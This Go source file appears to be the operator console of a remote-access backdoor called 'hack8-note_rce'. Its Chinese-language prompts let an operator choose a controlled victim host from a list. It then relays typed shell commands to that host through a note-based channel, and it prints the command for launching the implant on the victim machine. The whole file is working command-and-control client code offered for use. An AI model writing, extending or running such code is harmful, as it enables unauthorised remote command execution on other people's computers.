package main

import (
	"fmt"
	"hack8-note_rce/Util"
	"github.com/AlecAivazis/survey/v2"
	"time"
	"bufio"
	"strings"
	"os"
)


func hostList(admin string){
	list := Util.HostList(admin)
	// for i := range list {
	// 	fmt.Printf("%v:主机名:[%v]\x09note地址:[%v]\x09notekey:[%v]\n", i, list[i].HostName, list[i].Id, list[i].Notekey)
	// }
	var selectHost string
	options := []string{}
	for _, host := range list {
        options = append(options, host.HostName)
    }
	prompt := &survey.Select{
		Message: "选择一个被控端: ",
		Options: options,
	}
	survey.AskOne(prompt, &selectHost)

	var noteKey string
	var noteId string
	for i := range list {
		if list[i].HostName == selectHost {
			noteKey = list[i].Notekey
			noteId = list[i].Id
		}
	}
	hostExec(noteId, noteKey)
}

func hostExec(noteId, noteKey string){
	Util.Hostexec(noteId, noteKey, "chcp 65001")
    for {
    	time.Sleep(1 * time.Second)
    	fmt.Print("请输入shell命令:")
    	reader := bufio.NewReader(os.Stdin)
    	command, _ := reader.ReadString('\n') 
    	command = strings.TrimSpace(command)
    	if command == "exit" {
    		break
    	}
    	if command != "" {
    		Util.Hostexec(noteId, noteKey, command)
    	}
    }
}

func main() {
	var admin string
	fmt.Println("被控端运行命令 key参数制定notekey admin参数制定主控地址（建议更改） ：\n./server --key notekey --admin ocis")

	fmt.Println("请输入主控地址(默认为ocis)：")
	fmt.Scan(&admin)
	hostList(admin)

}
